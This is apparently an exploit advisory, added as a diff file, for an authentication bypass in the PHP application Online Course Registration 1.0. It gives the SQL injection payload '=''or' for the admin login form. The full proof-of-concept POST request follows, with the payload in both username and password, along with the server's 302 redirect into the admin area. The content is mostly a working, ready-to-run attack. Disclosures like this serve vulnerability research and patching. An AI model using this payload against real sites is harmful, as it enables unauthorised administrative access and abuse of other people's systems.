@@ -1,0 +1,40 @@
+# Exploit Title: Online Course Registration 1.0 - Authentication Bypass
+# Google Dork: N/A
+# Date: 2020-06-05
+# Exploit Author: BKpatron
+# Vendor Homepage: https://www.sourcecodester.com/php/14251/online-course-registration.html
+# Software Link:  https://www.sourcecodester.com/sites/default/files/download/razormist/online-course-registration.zip
+# Version: v1.0
+# Tested on: Win 10
+# CVE: N/A
+# my website: bkpatron.com
+
+# Vulnerability: Attacker can bypass login page and access to dashboard page
+# vulnerable file : admin/index.php
+# Parameter & Payload: '=''or'
+# Proof of Concept:
+
+http://localhost/Online%20Course%20Registration/admin/index.php
+
+POST /Online%20Course%20Registration/admin/index.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Referer: http://localhost/Online%20Course%20Registration/admin/index.php
+Cookie: PHPSESSID=il6a0lzq8ndo1bb4672rd7cr3m
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+username=%27%3D%27%27or%27&password=%27%3D%27%27or%27&submit=: undefined
+
+HTTP/1.1 302 Found
+Date: Thu, 04 Jun 2020 20:04:27 GMT
+Server: Apache/2.4.39 (Win64) PHP/7.3.5
+X-Powered-By: PHP/7.3.5
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+location: http://localhost/Online Course Registration/admin/change-password.php
